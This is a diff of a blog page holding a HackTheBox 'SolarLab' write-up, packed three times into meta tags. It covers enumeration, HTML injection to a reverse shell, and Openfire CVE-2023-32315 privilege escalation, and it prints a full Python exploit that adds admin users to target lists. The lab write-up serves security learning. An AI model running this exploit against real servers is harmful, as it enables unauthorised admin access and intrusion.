@@ -8,8 +8,8 @@
 <meta property="og:title" content="SolarLab-Windows-Medium" />
 <meta name="author" content="GitHub User" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="SolarLab" />
-<meta property="og:description" content="SolarLab" />
+<meta name="description" content="SolarLab 1. Enumeration Start with nmap enumeration, we have a http service and smb services running, it tries to redirect us to a domain, once we add the domain to etc/hosts file In the http service we didn’t find anything interesting at least in the main url, in the other one there is a log in page, we may try to get credentials or something like that we can scan port 6791 and it disclose another url: http:report.solarlab.htb Using crackmapexec to search some share files we found some files The .xlsx file disclose information about usernames and passwords, now we need to find a place where we can use it 2. User flag After we proceed to spray passwords on smb we realize there’s nothing which can help us to get progress If you can see, there is a trick right here, in the .xlsx file all usernames are composed by a name and a letter which is the first letter of the next or previous name, taking this and looking for anomalies bakle.byte is the only one user name that doesn’t follow this pattern, but what happens if we make that blake follow this pattern? It would be something like: Usename: blakeb Password: password Those are valid credentials to the web application running on 6791 We can leave a request on this page, this request generates a pdf file, let’s search if we can do anything with this According with the name of the machine this looks promising But we need to find a way to inject this code here and execute remote commands with this. Previously we tried to change the .png file on the request but it is properly sanitized so we will try to inject the html code in leave request parameter. here we have the payload to exploit the vulnerability but to get the reverse shell we will need to use powershell base 64 User flag got succesfully 3.Priv esc There is a openfire user, as we have learnt there are some vulnerabilities around there So check if there is a service running locally and try to port forwarding using that port CVE-2023-32315 This vulnerability lies within the web-based Admin Console, allowing a path traversal attack through the setup environment. This flaw allows unauthenticated users to access restricted pages intended for administrative users import random import string import argparse from concurrent.futures import ThreadPoolExecutor import HackRequests artwork = &#39;&#39;&#39; ██████╗██╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██╗███████╗ ██╔════╝██║ ██║██╔════╝ ╚════██╗██╔═████╗╚════██╗╚════██╗ ╚════██╗╚════██╗╚════██╗███║██╔════╝ ██║ ██║ ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗ ██║ ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚═══██╗╚════╝╚═══██╗██╔═══╝ ╚═══██╗ ██║╚════██║ ╚██████╗ ╚████╔╝ ███████╗ ███████╗╚██████╔╝███████╗██████╔╝ ██████╔╝███████╗██████╔╝ ██║███████║ ╚═════╝ ╚═══╝ ╚══════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝╚══════╝ Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215) Use at your own risk! &#39;&#39;&#39; def generate_random_string(length): charset = string.ascii_lowercase + string.digits return &#39;&#39;.join(random.choice(charset) for _ in range(length)) def between(string, starting, ending): s = string.find(starting) if s &lt; 0: return &quot;&quot; s += len(starting) e = string[s:].find(ending) if e &lt; 0: return &quot;&quot; return string[s : s+e] final_result = [] def exploit(target): hack = HackRequests.hackRequests() host = target.split(&quot;://&quot;)[1] # setup 1: get csrf + jsessionid jsessionid = &quot;&quot; csrf = &quot;&quot; try: url = f&quot;{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp&quot; headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;X-Forwarded-For&quot;: &quot;1.2.3.4&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } print(f&quot;[..] Checking target: {target}&quot;) hh = hack.http(url, headers=headers) jsessionid = hh.cookies.get(&#39;JSESSIONID&#39;, &#39;&#39;) csrf = hh.cookies.get(&#39;csrf&#39;, &#39;&#39;) if jsessionid != &quot;&quot; and csrf != &quot;&quot;: print(f&quot;Successfully retrieved JSESSIONID: {jsessionid} + csrf: {csrf}&quot;) else: print(&quot;Failed to get JSESSIONID and csrf value&quot;) return # setup 2: add user username = generate_random_string(6) password = generate_random_string(6) header2 = { &quot;Host&quot;: host, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Cookie&quot;: f&quot;JSESSIONID={jsessionid}; csrf={csrf}&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;X-Forwarded-For&quot;: &quot;1.2.3.4&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } create_user_url= f&quot;{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&amp;username={username}&amp;name=&amp;email=&amp;password={password}&amp;passwordConfirm={password}&amp;isadmin=on&amp;create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7&quot; hhh = hack.http(create_user_url, headers=header2) if hhh.status_code == 200: print(f&quot;User added successfully: url: {target} username: {username} password: {password}&quot;) with open(&quot;success.txt&quot;, &quot;a+&quot;) as f: f.write(f&quot;url: {target} username: {username} password: {password}\n&quot;) else: print(&quot;Failed to add user&quot;) # setup 3: add plugin except Exception as e: print(f&quot;Error occurred while retrieving cookies: {e}&quot;) def main(): print(artwork) ## parse argument parser = argparse.ArgumentParser() parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, help=&#39;The URL of the target, eg: http://127.0.0.1:9090&#39;, default=False) parser.add_argument(&quot;-l&quot;, &quot;--list&quot;, action=&quot;store&quot;, help=&quot;List of target url saperated with new line&quot;, default=False) args = parser.parse_args() if args.target is not False: exploit(args.target) elif args.list is not False: with open(args.list) as targets: for target in targets: target = target.rstrip() if target == &quot;&quot;: continue if &quot;http&quot; not in target: target = &quot;http://&quot; + target exploit(target) else: parser.print_help() parser.exit() # def main(): # parser = argparse.ArgumentParser(description=&quot;CVE-2023-32315&quot;) # parser.add_argument(&quot;-u&quot;, help=&quot;Target URL&quot;) # parser.add_argument(&quot;-l&quot;, help=&quot;File containing URLs&quot;) # parser.add_argument(&quot;-t&quot;, type=int, default=10, help=&quot;Number of threads&quot;) # args = parser.parse_args() # target_url = args.u # file_path = args.l # thread = args.t # targets = [] # if target_url is None: # with open(file_path, &quot;r&quot;) as file: # for line in file: # target = line.strip() # if target == &quot;&quot;: # continue # if &quot;http&quot; not in target: # target = &quot;http://&quot; + target # targets.append(target) # with ThreadPoolExecutor(max_workers=thread) as executor: # for target in targets: # executor.submit(exploit, target) # else: # exploit(target_url) if __name__ == &quot;__main__&quot;: main() Log in as the new admin user Exploit the vulnerability uploading the plugin Use the same rev shell that we used before to get user flag Now we are Openfire user, and we are able to dig into configuration files on the machine, it is also possible to look for logs and scripts In .script file we found administrator credentials with a encrypted password, but some code lines below we have the key We search on internet a script able to decrypt openfire passwords, and we got the password!! Using those credentials we can execute commands with those privileges we will use RunasCs to run powershell on the listener port Machine pwned!!" />
+<meta property="og:description" content="SolarLab 1. Enumeration Start with nmap enumeration, we have a http service and smb services running, it tries to redirect us to a domain, once we add the domain to etc/hosts file In the http service we didn’t find anything interesting at least in the main url, in the other one there is a log in page, we may try to get credentials or something like that we can scan port 6791 and it disclose another url: http:report.solarlab.htb Using crackmapexec to search some share files we found some files The .xlsx file disclose information about usernames and passwords, now we need to find a place where we can use it 2. User flag After we proceed to spray passwords on smb we realize there’s nothing which can help us to get progress If you can see, there is a trick right here, in the .xlsx file all usernames are composed by a name and a letter which is the first letter of the next or previous name, taking this and looking for anomalies bakle.byte is the only one user name that doesn’t follow this pattern, but what happens if we make that blake follow this pattern? It would be something like: Usename: blakeb Password: password Those are valid credentials to the web application running on 6791 We can leave a request on this page, this request generates a pdf file, let’s search if we can do anything with this According with the name of the machine this looks promising But we need to find a way to inject this code here and execute remote commands with this. Previously we tried to change the .png file on the request but it is properly sanitized so we will try to inject the html code in leave request parameter. here we have the payload to exploit the vulnerability but to get the reverse shell we will need to use powershell base 64 User flag got succesfully 3.Priv esc There is a openfire user, as we have learnt there are some vulnerabilities around there So check if there is a service running locally and try to port forwarding using that port CVE-2023-32315 This vulnerability lies within the web-based Admin Console, allowing a path traversal attack through the setup environment. This flaw allows unauthenticated users to access restricted pages intended for administrative users import random import string import argparse from concurrent.futures import ThreadPoolExecutor import HackRequests artwork = &#39;&#39;&#39; ██████╗██╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██╗███████╗ ██╔════╝██║ ██║██╔════╝ ╚════██╗██╔═████╗╚════██╗╚════██╗ ╚════██╗╚════██╗╚════██╗███║██╔════╝ ██║ ██║ ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗ ██║ ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚═══██╗╚════╝╚═══██╗██╔═══╝ ╚═══██╗ ██║╚════██║ ╚██████╗ ╚████╔╝ ███████╗ ███████╗╚██████╔╝███████╗██████╔╝ ██████╔╝███████╗██████╔╝ ██║███████║ ╚═════╝ ╚═══╝ ╚══════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝╚══════╝ Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215) Use at your own risk! &#39;&#39;&#39; def generate_random_string(length): charset = string.ascii_lowercase + string.digits return &#39;&#39;.join(random.choice(charset) for _ in range(length)) def between(string, starting, ending): s = string.find(starting) if s &lt; 0: return &quot;&quot; s += len(starting) e = string[s:].find(ending) if e &lt; 0: return &quot;&quot; return string[s : s+e] final_result = [] def exploit(target): hack = HackRequests.hackRequests() host = target.split(&quot;://&quot;)[1] # setup 1: get csrf + jsessionid jsessionid = &quot;&quot; csrf = &quot;&quot; try: url = f&quot;{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp&quot; headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;X-Forwarded-For&quot;: &quot;1.2.3.4&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } print(f&quot;[..] Checking target: {target}&quot;) hh = hack.http(url, headers=headers) jsessionid = hh.cookies.get(&#39;JSESSIONID&#39;, &#39;&#39;) csrf = hh.cookies.get(&#39;csrf&#39;, &#39;&#39;) if jsessionid != &quot;&quot; and csrf != &quot;&quot;: print(f&quot;Successfully retrieved JSESSIONID: {jsessionid} + csrf: {csrf}&quot;) else: print(&quot;Failed to get JSESSIONID and csrf value&quot;) return # setup 2: add user username = generate_random_string(6) password = generate_random_string(6) header2 = { &quot;Host&quot;: host, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Cookie&quot;: f&quot;JSESSIONID={jsessionid}; csrf={csrf}&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;X-Forwarded-For&quot;: &quot;1.2.3.4&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } create_user_url= f&quot;{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&amp;username={username}&amp;name=&amp;email=&amp;password={password}&amp;passwordConfirm={password}&amp;isadmin=on&amp;create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7&quot; hhh = hack.http(create_user_url, headers=header2) if hhh.status_code == 200: print(f&quot;User added successfully: url: {target} username: {username} password: {password}&quot;) with open(&quot;success.txt&quot;, &quot;a+&quot;) as f: f.write(f&quot;url: {target} username: {username} password: {password}\n&quot;) else: print(&quot;Failed to add user&quot;) # setup 3: add plugin except Exception as e: print(f&quot;Error occurred while retrieving cookies: {e}&quot;) def main(): print(artwork) ## parse argument parser = argparse.ArgumentParser() parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, help=&#39;The URL of the target, eg: http://127.0.0.1:9090&#39;, default=False) parser.add_argument(&quot;-l&quot;, &quot;--list&quot;, action=&quot;store&quot;, help=&quot;List of target url saperated with new line&quot;, default=False) args = parser.parse_args() if args.target is not False: exploit(args.target) elif args.list is not False: with open(args.list) as targets: for target in targets: target = target.rstrip() if target == &quot;&quot;: continue if &quot;http&quot; not in target: target = &quot;http://&quot; + target exploit(target) else: parser.print_help() parser.exit() # def main(): # parser = argparse.ArgumentParser(description=&quot;CVE-2023-32315&quot;) # parser.add_argument(&quot;-u&quot;, help=&quot;Target URL&quot;) # parser.add_argument(&quot;-l&quot;, help=&quot;File containing URLs&quot;) # parser.add_argument(&quot;-t&quot;, type=int, default=10, help=&quot;Number of threads&quot;) # args = parser.parse_args() # target_url = args.u # file_path = args.l # thread = args.t # targets = [] # if target_url is None: # with open(file_path, &quot;r&quot;) as file: # for line in file: # target = line.strip() # if target == &quot;&quot;: # continue # if &quot;http&quot; not in target: # target = &quot;http://&quot; + target # targets.append(target) # with ThreadPoolExecutor(max_workers=thread) as executor: # for target in targets: # executor.submit(exploit, target) # else: # exploit(target_url) if __name__ == &quot;__main__&quot;: main() Log in as the new admin user Exploit the vulnerability uploading the plugin Use the same rev shell that we used before to get user flag Now we are Openfire user, and we are able to dig into configuration files on the machine, it is also possible to look for logs and scripts In .script file we found administrator credentials with a encrypted password, but some code lines below we have the key We search on internet a script able to decrypt openfire passwords, and we got the password!! Using those credentials we can execute commands with those privileges we will use RunasCs to run powershell on the listener port Machine pwned!!" />
 <link rel="canonical" href="https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html" />
 <meta property="og:url" content="https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html" />
 <meta property="og:site_name" content="Pwn3d777" />
@@ -18,7 +18,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="SolarLab-Windows-Medium" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-11T16:05:57+00:00","datePublished":"2025-07-11T16:05:57+00:00","description":"SolarLab","headline":"SolarLab-Windows-Medium","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html"},"url":"https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-11T16:05:57+00:00","datePublished":"2025-07-11T16:05:57+00:00","description":"SolarLab 1. Enumeration Start with nmap enumeration, we have a http service and smb services running, it tries to redirect us to a domain, once we add the domain to etc/hosts file In the http service we didn’t find anything interesting at least in the main url, in the other one there is a log in page, we may try to get credentials or something like that we can scan port 6791 and it disclose another url: http:report.solarlab.htb Using crackmapexec to search some share files we found some files The .xlsx file disclose information about usernames and passwords, now we need to find a place where we can use it 2. User flag After we proceed to spray passwords on smb we realize there’s nothing which can help us to get progress If you can see, there is a trick right here, in the .xlsx file all usernames are composed by a name and a letter which is the first letter of the next or previous name, taking this and looking for anomalies bakle.byte is the only one user name that doesn’t follow this pattern, but what happens if we make that blake follow this pattern? It would be something like: Usename: blakeb Password: password Those are valid credentials to the web application running on 6791 We can leave a request on this page, this request generates a pdf file, let’s search if we can do anything with this According with the name of the machine this looks promising But we need to find a way to inject this code here and execute remote commands with this. Previously we tried to change the .png file on the request but it is properly sanitized so we will try to inject the html code in leave request parameter. here we have the payload to exploit the vulnerability but to get the reverse shell we will need to use powershell base 64 User flag got succesfully 3.Priv esc There is a openfire user, as we have learnt there are some vulnerabilities around there So check if there is a service running locally and try to port forwarding using that port CVE-2023-32315 This vulnerability lies within the web-based Admin Console, allowing a path traversal attack through the setup environment. This flaw allows unauthenticated users to access restricted pages intended for administrative users import random import string import argparse from concurrent.futures import ThreadPoolExecutor import HackRequests artwork = &#39;&#39;&#39; ██████╗██╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██╗███████╗ ██╔════╝██║ ██║██╔════╝ ╚════██╗██╔═████╗╚════██╗╚════██╗ ╚════██╗╚════██╗╚════██╗███║██╔════╝ ██║ ██║ ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗ ██║ ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚═══██╗╚════╝╚═══██╗██╔═══╝ ╚═══██╗ ██║╚════██║ ╚██████╗ ╚████╔╝ ███████╗ ███████╗╚██████╔╝███████╗██████╔╝ ██████╔╝███████╗██████╔╝ ██║███████║ ╚═════╝ ╚═══╝ ╚══════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝╚══════╝ Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215) Use at your own risk! &#39;&#39;&#39; def generate_random_string(length): charset = string.ascii_lowercase + string.digits return &#39;&#39;.join(random.choice(charset) for _ in range(length)) def between(string, starting, ending): s = string.find(starting) if s &lt; 0: return &quot;&quot; s += len(starting) e = string[s:].find(ending) if e &lt; 0: return &quot;&quot; return string[s : s+e] final_result = [] def exploit(target): hack = HackRequests.hackRequests() host = target.split(&quot;://&quot;)[1] # setup 1: get csrf + jsessionid jsessionid = &quot;&quot; csrf = &quot;&quot; try: url = f&quot;{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp&quot; headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;X-Forwarded-For&quot;: &quot;1.2.3.4&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } print(f&quot;[..] Checking target: {target}&quot;) hh = hack.http(url, headers=headers) jsessionid = hh.cookies.get(&#39;JSESSIONID&#39;, &#39;&#39;) csrf = hh.cookies.get(&#39;csrf&#39;, &#39;&#39;) if jsessionid != &quot;&quot; and csrf != &quot;&quot;: print(f&quot;Successfully retrieved JSESSIONID: {jsessionid} + csrf: {csrf}&quot;) else: print(&quot;Failed to get JSESSIONID and csrf value&quot;) return # setup 2: add user username = generate_random_string(6) password = generate_random_string(6) header2 = { &quot;Host&quot;: host, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Cookie&quot;: f&quot;JSESSIONID={jsessionid}; csrf={csrf}&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;X-Forwarded-For&quot;: &quot;1.2.3.4&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } create_user_url= f&quot;{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&amp;username={username}&amp;name=&amp;email=&amp;password={password}&amp;passwordConfirm={password}&amp;isadmin=on&amp;create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7&quot; hhh = hack.http(create_user_url, headers=header2) if hhh.status_code == 200: print(f&quot;User added successfully: url: {target} username: {username} password: {password}&quot;) with open(&quot;success.txt&quot;, &quot;a+&quot;) as f: f.write(f&quot;url: {target} username: {username} password: {password}\\n&quot;) else: print(&quot;Failed to add user&quot;) # setup 3: add plugin except Exception as e: print(f&quot;Error occurred while retrieving cookies: {e}&quot;) def main(): print(artwork) ## parse argument parser = argparse.ArgumentParser() parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, help=&#39;The URL of the target, eg: http://127.0.0.1:9090&#39;, default=False) parser.add_argument(&quot;-l&quot;, &quot;--list&quot;, action=&quot;store&quot;, help=&quot;List of target url saperated with new line&quot;, default=False) args = parser.parse_args() if args.target is not False: exploit(args.target) elif args.list is not False: with open(args.list) as targets: for target in targets: target = target.rstrip() if target == &quot;&quot;: continue if &quot;http&quot; not in target: target = &quot;http://&quot; + target exploit(target) else: parser.print_help() parser.exit() # def main(): # parser = argparse.ArgumentParser(description=&quot;CVE-2023-32315&quot;) # parser.add_argument(&quot;-u&quot;, help=&quot;Target URL&quot;) # parser.add_argument(&quot;-l&quot;, help=&quot;File containing URLs&quot;) # parser.add_argument(&quot;-t&quot;, type=int, default=10, help=&quot;Number of threads&quot;) # args = parser.parse_args() # target_url = args.u # file_path = args.l # thread = args.t # targets = [] # if target_url is None: # with open(file_path, &quot;r&quot;) as file: # for line in file: # target = line.strip() # if target == &quot;&quot;: # continue # if &quot;http&quot; not in target: # target = &quot;http://&quot; + target # targets.append(target) # with ThreadPoolExecutor(max_workers=thread) as executor: # for target in targets: # executor.submit(exploit, target) # else: # exploit(target_url) if __name__ == &quot;__main__&quot;: main() Log in as the new admin user Exploit the vulnerability uploading the plugin Use the same rev shell that we used before to get user flag Now we are Openfire user, and we are able to dig into configuration files on the machine, it is also possible to look for logs and scripts In .script file we found administrator credentials with a encrypted password, but some code lines below we have the key We search on internet a script able to decrypt openfire passwords, and we got the password!! Using those credentials we can execute commands with those privileges we will use RunasCs to run powershell on the listener port Machine pwned!!","headline":"SolarLab-Windows-Medium","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html"},"url":"https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" href="/assets/css/style.css">
   <link rel="icon" type="image/png" href="/assets/favicon.png" />
@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">SolarLab-Windows-Medium</h1>
   
@@ -65,103 +57,102 @@
   </div>
   
   <h1 id="solarlab">SolarLab</h1>
-
+<p><br /><br /></p>
 <h1 id="1-enumeration">1. Enumeration</h1>
-
-<p>Start with nmap enumeration, we have a http service and smb services running, it tries to redirect us to a domain, once we add the domain to etc/hosts file</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled.png" alt="Untitled" /></p>
-
-<p>In the http service we didn’t find anything interesting at least in the main url, in the other one there is a log in page, we may try to get credentials or something like that</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_1.png" alt="Untitled" /></p>
-
-<p>we can scan port 6791 and it disclose another url: http:report.solarlab.htb</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_2.png" alt="Untitled" /></p>
-
-<p>Using crackmapexec to search some share files we found some files</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_3.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_4.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_5.png" alt="Untitled" /></p>
-
-<p>The .xlsx file disclose information about usernames and passwords, now we need to find a place where we can use it</p>
-
-<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_6.png" alt="Untitled" /></p>
-
+<p><br /><br />
+Start with nmap enumeration, we have a http service and smb services running, it tries to redirect us to a domain, once we add the domain to etc/hosts file 
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled.png" alt="Untitled" />
+<br /><br />
+In the http service we didn’t find anything interesting at least in the main url, in the other one there is a log in page, we may try to get credentials or something like that
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_1.png" alt="Untitled" />
+<br /><br />
+we can scan port 6791 and it disclose another url: http:report.solarlab.htb
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_2.png" alt="Untitled" />
+<br /><br />
+Using crackmapexec to search some share files we found some files
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_3.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_4.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_5.png" alt="Untitled" />
+<br /><br />
+The .xlsx file disclose information about usernames and passwords, now we need to find a place where we can use it
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_6.png" alt="Untitled" />
+<br /><br /></p>
